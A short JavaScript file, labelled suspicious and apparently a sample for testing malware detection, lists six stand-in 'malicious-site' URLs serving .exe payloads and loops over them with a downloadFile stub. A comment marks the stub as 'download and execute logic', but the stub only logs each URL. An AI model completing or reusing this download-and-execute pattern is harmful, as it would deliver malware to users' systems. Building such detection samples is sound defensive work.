// Suspicious JavaScript with multiple URLs
var urls = [
    "https://malicious-site1.com/payload1.exe",
    "https://malicious-site2.com/payload2.exe", 
    "https://malicious-site3.com/payload3.exe",
    "https://malicious-site4.com/payload4.exe",
    "https://malicious-site5.com/payload5.exe",
    "https://malicious-site6.com/payload6.exe"
];

for (var i = 0; i < urls.length; i++) {
    downloadFile(urls[i]);
}

function downloadFile(url) {
    // Download and execute logic
    console.log("Downloading from: " + url);
}
